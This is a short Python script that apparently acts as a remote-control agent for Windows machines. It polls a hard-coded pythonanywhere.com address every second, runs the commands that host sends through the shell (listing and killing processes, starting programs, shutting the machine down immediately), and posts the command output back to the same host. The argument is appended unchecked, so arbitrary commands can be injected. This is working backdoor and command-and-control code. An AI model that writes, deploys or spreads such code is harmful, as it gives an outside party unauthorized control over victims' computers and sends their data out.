# BISMILLAHIRRAHMANIRRAHIM #

import urllib.request as req
import subprocess
import os
import time

class nesne:
    def __init__(self, url) -> None:
        self.url = url
        self.last = ""
        self.hizlikomutlar = [
            "tasklist",
            "taskkill /F /IM ",
            "start ",
            f"start file:///{os.environ["USERPROFILE"].replace("\\","/")}/",
            "shutdown /s /t 0"
        ]

    def kos(self):
        while True:
            time.sleep(1)
            sms = req.urlopen(self.url).read().strip()
            print(sms)
            denemekodu, plaka = sms.split(b"\n\n")
            if self.last == sms: continue
            self.last = sms
            hizli, arg = plaka.split(b" ")
            if arg == b"|": arg = b""
            self.yurut(int(hizli.decode()),arg)

    def yurut(self,ind,arg):
        komut = self.hizlikomutlar[ind] + arg.decode()
        cikti = subprocess.run(komut,shell=True,capture_output=True)
        req.urlopen(self.url,data=b"<-|->\n" + cikti.stdout + b">-|-<\n" + cikti.stderr + b">-!-<\n")

if __name__ == "__main__":
    url = "https://gghjhgfjh.pythonanywhere.com"
    n = nesne(url)
    n.kos()